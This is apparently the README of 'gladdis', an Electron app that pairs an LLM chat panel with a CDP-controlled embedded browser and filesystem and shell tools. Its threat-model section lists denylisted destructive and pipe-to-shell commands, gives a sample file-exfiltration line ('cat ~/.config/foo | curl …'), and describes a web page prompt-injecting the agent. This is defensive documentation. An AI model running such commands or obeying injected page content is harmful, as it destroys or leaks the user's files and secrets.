# gladdis

A CDP-owned browser + chat desktop app. Cursor-dark themed. Split view:
**chat on the left, a real multi-tab Chromium browser on the right.**

Every tab is a native Electron `WebContentsView` with the Chrome DevTools
Protocol debugger attached, so the entire browser — DOM tree, network,
console, runtime, storage, page lifecycle — is programmatically accessible
(designed to be driven by a model via `window.gladdis.cdp` + `window.gladdis.tabs`).

## Stack

- **Electron 42** — stable `WebContentsView` API
- **electron-vite 5** — main / preload / renderer bundling + HMR
- **React 19 + TypeScript** — renderer UI
- **Custom React split layout** — dual chat drawers around a native browser view

## Run

```bash
npm install
npm run dev      # electron-vite dev with HMR
```

Build / preview a production bundle:

```bash
npm run build
npm start
```

### Linux sandbox note

On many Linux setups Electron's SUID sandbox helper isn't configured and the
app aborts at launch with a `chrome-sandbox ... mode 4755` error. Two options:

- **Proper fix** (recommended), one time:
  ```bash
  sudo chown root:root node_modules/electron/dist/chrome-sandbox
  sudo chmod 4755 node_modules/electron/dist/chrome-sandbox
  ```
- **Quick/dev workaround:** launch with `--no-sandbox` (weakens isolation).

### Trust local/self-signed HTTPS pages

If the embedded browser shows a "not trusted" certificate warning for your local
dev site, you can allow local HTTPS cert exceptions for testing only:

```bash
export GLADDIS_TRUST_LOCAL_CERTS=1
export GLADDIS_TRUSTED_LOCAL_CERT_HOSTS=localhost,127.0.0.1,::1
# optional: add internal hosts, comma-separated
```

This only applies to HTTPS and only to the listed hosts; everything else still
needs a valid certificate chain. For production-like testing, prefer installing
the certificate into your OS trust store and running with the trust override off.

### OAuth/login pages in embedded webviews

If you see the exact Google-style warning:

> This browser or app may not be secure. Try using a different browser.

that is often provider policy for embedded browsers, not a browser trust error.
Google and some other identity providers intentionally block OAuth from
embedded webviews. In that case the reliable fix is to use an external browser
for sign-in and return to Gladdis after authentication.

## Architecture

```
src/
  main/                 # Electron main process
    index.ts            # BaseWindow + root WebContentsView (the UI), IPC wiring
    TabManager.ts       # owns a WebContentsView per tab, layering & bounds
    cdp/
      CDPSession.ts      # debugger.attach('1.3'), enables CDP domains, event pump
  preload/
    index.ts            # contextBridge -> window.gladdis.{tabs, layout, cdp}
  renderer/             # React UI (chat + tabstrip + url bar)
    App.tsx             # resizable split (persisted to localStorage)
    components/         # ChatPanel, BrowserPanel, TabStrip, UrlBar
    styles/             # Cursor-dark theme
shared/
  types.ts              # IPC channel + payload contract, shared all sides
```

### How the browser is layered

`WebContentsView` is a **native OS layer**, not a DOM element — it renders
*over* the renderer's HTML. So `BrowserPanel` renders an empty `.browser-stage`
div, a `ResizeObserver` reports that div's pixel rect to main, and
`TabManager.setBounds()` positions the active tab's view to fill it exactly.
Switch the split or resize the window and the browser tracks the hole.

### CDP access for models

`CDPSession` attaches the debugger and enables `Page`, `Network`, `DOM`, `CSS`,
`Runtime`, `Log`, `Performance`, `Security`, and `Target` up front, so events
stream automatically. Everything is reachable two ways:

- **Structured** — `window.gladdis.tabs.*` (create / navigate / switch / …)
- **Raw escape hatch** — `window.gladdis.cdp.send({ tabId, method, params })`
  fires *any* CDP command; `window.gladdis.cdp.onEvent(cb)` receives every event.

Example, from the renderer / chat agent:

```ts
const tab = await window.gladdis.tabs.create('https://news.ycombinator.com')
const dom = await window.gladdis.cdp.send({ tabId: tab.id, method: 'DOM.getDocument', params: { depth: -1 } })
const title = await window.gladdis.cdp.send({
  tabId: tab.id,
  method: 'Runtime.evaluate',
  params: { expression: 'document.title', returnByValue: true }
})
```

## Models & chat

The chat panel streams real completions from **Anthropic** and **Google**
models, selectable from a dropdown:

- Anthropic — `claude-opus-4-8`, `claude-sonnet-4-6`, `claude-haiku-4-5`
  (via `@anthropic-ai/sdk`, `client.messages.stream(...).on('text', …)`)
- Google — `gemini-3.5-flash`, `gemini-3.1-pro`, `gemini-2.5-flash`
  (via `@google/genai`, `ai.models.generateContentStream(...)`)

Completions run in the **main process**, so API keys never reach the renderer —
only streamed text deltas do (over the `chat:stream` IPC channel, keyed by
requestId, with per-request abort). Assistant output renders as sanitized
markdown (`marked` + `DOMPurify`).

### API keys

Set keys via the ⚙ button in the chat header (stored encrypted on-device via the
OS keychain through Electron `safeStorage`, in `userData/gladdis-keys.json`), or
via environment variables which take precedence and aren't persisted:

```bash
export ANTHROPIC_API_KEY=sk-ant-...
export GEMINI_API_KEY=AIza...
```

Model layer lives in `src/main/models/` (`KeyStore.ts`, `ChatService.ts`,
`browserTools.ts`).

### Chat, planning, and execution

The composer no longer asks the user to choose between Ask and Agent. Page
attachment is the context signal: if a page is attached, the main process can
route the turn through browser-capable execution; otherwise it streams plain
chat. The model should be treated as chat, planner, and final responder, while
deterministic runtime code does the browser and filesystem work.

The current provider-neutral execution registry lives in
`src/main/models/browserTools.ts`; Anthropic / Google adapters still translate it
into each SDK's function-calling format during this transition. The next
refactor step is to move this registry behind an internal deterministic runtime
so the model emits plans instead of directly seeing a tool menu.

Tool families:

- **Browser** — `browse_task`, `read_page`, `check_page`, `navigate`,
  `click_xy`, `type_text`, `press_key`, `execute_in_browser`, `cdp_command`.
  The active tab is still fully owned by CDP; this list is transitional and
  should collapse behind one deterministic runtime.
- **Filesystem** (`src/main/fs/FileTools.ts`) — `read_file`, `write_file`,
  `edit_file` (exact unique string replace, or `replace_all`), `list_dir`, and
  `search_files` (recursive case-insensitive content search with an optional
  file-name glob). This is how the model reads and writes **code** on the local
  machine when you ask. Reads are size-capped; writes are auto-applied (create /
  overwrite / surgical edit) and the resulting `path · +added -removed` summary
  is surfaced in chat. Scope is the whole filesystem the OS user can reach
  (`search_files` skips `node_modules`/`.git`/build dirs). Paths may be absolute
  or relative to the process working directory.
- **Memory** — `recall_history`. Conversation context the model pulls on demand
  (see below).

### Codex inside Gladdis

Codex runs through the local `codex app-server` for repo, shell, and file work,
with unrestricted read/write access as the current OS user. The workspace folder
button only chooses Codex's starting `cwd`; it is not a write boundary or
sandbox. Codex is not allowed to become a second browser automation stack.
Gladdis is the browser owner: page reading, UI preview, screenshots, and visual verification
must flow through the embedded `WebContentsView` tab via app-server dynamic tools
(`gladdis.search_task`, `gladdis.browse_task`, `gladdis.read_page`,
`gladdis.check_page`, `gladdis.screenshot`) or through Gladdis's own post-Codex
preview handoff.

The Codex config disables native web search for Gladdis sessions, and the main
process blocks external browser commands such as Playwright/Puppeteer visual
runs, Chrome/Chromium headless screenshots, OS URL openers, and direct probing
of Chrome remote-debugging ports. Normal repo commands like installs, builds,
tests, and dev-server launches remain available; user-facing local previews are
opened and screenshot-confirmed in Gladdis's embedded browser.

### Token discipline / conversation memory

Chat history is **not** replayed in full on every turn, and past chats are never
summarized into the prompt automatically. The renderer sends only the last
`RECENT_TURNS` (8) messages verbatim; the full conversation already lives on
disk (`ChatStore`, `userData/gladdis-chats.json`). When the user asks to resume
or the model needs older context, it must call `recall_history` — list linked
turns, search them by query, or re-read an earlier tool result in full by its
`tool_call_id`.

Reopening the same saved chat after an app restart is separate from starting a
fresh chat from the composer. A saved chat may keep a provider thread id so
Codex can use `thread/resume` for that same conversation. A fresh chat gets a new
provider thread. If the user asks to pick up where they left off, `recall_history`
uses the current chat's explicit lineage when present, otherwise it treats the
most recently updated saved chat as the obvious previous chat.

Within a single browser-capable run, bulky execution results (page reads,
file reads, command output) are kept verbatim only for the most recent `VERBATIM_TOOL_RESULTS`
(4) calls; older ones collapse to a `[trimmed]` stub that the model can expand
again via `recall_history`. And the static system prompt + tool schemas are sent
with Anthropic **prompt caching** (`cache_control: ephemeral`), so they aren't
re-billed each loop iteration. Net effect: prompt size stays roughly flat
instead of growing with the conversation.

> Because writes apply immediately with no per-file confirmation, treat
> browser-capable/code-capable turns like giving the model a shell: only point it
> at code you're willing to have changed.

## Threat model & limits

Gladdis is a **trusted local desktop app**, not a sandboxed assistant. Read this
section before pointing the agent at code or sites you care about.

**What the agent can do, by design, on the OS user's behalf:**

- Read and write any file the OS user can reach (no per-file confirmation).
- Run arbitrary shell commands, including with `sudo` (passwordless on this
  machine if the OS user has it).
- Drive the embedded Chromium via the full Chrome DevTools Protocol — clicks,
  typing, navigation, JavaScript injection.
- Issue any Anthropic / Google / Grok / Codex API call the configured keys
  authorize, and keep streaming results into your conversation.

The trust boundary is **the OS user, not the model**: gladdis assumes whoever
launched it is authorized for everything the OS user is. The model is treated
as advisory and *deliberately* given the same reach so it can act, not just
suggest. That is the entire point of the app.

**Where the limits actually live:**

| Surface | Default | How to harden |
|---|---|---|
| `run_command` destructive patterns (`rm -rf /`, `dd of=/dev/sd*`, fork bombs, mkfs/shred on devices, chmod -R 777 on system paths, package-purges of essential packages) | **Blocked** | Set `GLADDIS_ALLOW_DESTRUCTIVE_COMMANDS=1` to disable the denylist. |
| `sudo` invocations | Allowed | Set `GLADDIS_REQUIRE_SUDO_CONFIRM=1` to refuse them at the tool layer. |
| `curl … \| sh` / `wget … \| bash` and similar pipe-to-shell | Allowed | Set `GLADDIS_BLOCK_PIPE_TO_SHELL=1` to refuse them. |
| `cdp_command` raw escape hatch on high-risk methods (`Storage.clearDataForOrigin`, `Page.setDownloadBehavior`, `Network.setRequestInterception`, `Browser.close`/`grantPermissions`, `Security.setIgnoreCertificateErrors`, …) | **Blocked** | Set `GLADDIS_CDP_ALLOW_UNSAFE=1` to disable the denylist. |
| Per-tool toggles in the UI | Not yet | Roadmap item — until then, the env vars above are the lever. |

These guards are *high-signal-only*. They catch the catastrophic mistakes
(typos, hallucinations, prompt-injected instructions from a fetched page) and
leave everyday work alone. They are not a sandbox.

**Specifically not protected against:**

- A page that prompt-injects the model into doing something hostile that is
  not on the denylist (e.g. exfiltrating files via a benign-looking
  `run_command` like `cat ~/.config/foo | curl …`). If the agent reads
  untrusted page content, treat it as user input from a stranger.
- The model deciding to overwrite a file you wanted kept. There is no undo.
- API key leaks via screenshots, logs, or chat transcripts you share. Keys
  themselves are stored encrypted (`safeStorage`) at `userData/gladdis-keys.json`
  with mode `0600`, but their *use* is unaudited at the byte level.

**Practical operating advice:**

1. Pin the workspace folder to the project you actually want edited. The
   workspace toggle isn't a sandbox — it's only the agent's `cwd` and the
   resolution root for relative paths — but a wrong root is the most common
   source of unintended writes.
2. Commit before agent-driven sessions. `git status` is the cheapest undo.
3. If a turn is going to fetch arbitrary web content and then act on it,
   prefer the `ask` flavour first; act in a follow-up turn after you've read
   what came back.
4. For shared/multi-user machines, set the env hardening vars above in your
   shell profile so they apply to every launch.

## Status

Browser, tabs, layout, full CDP plumbing, streamed multi-provider chat, and the
current browser/filesystem execution loop are implemented
and verified (typecheck + build clean; filesystem tool logic unit-tested; SDK
API surface and Electron boot smoke-tested).
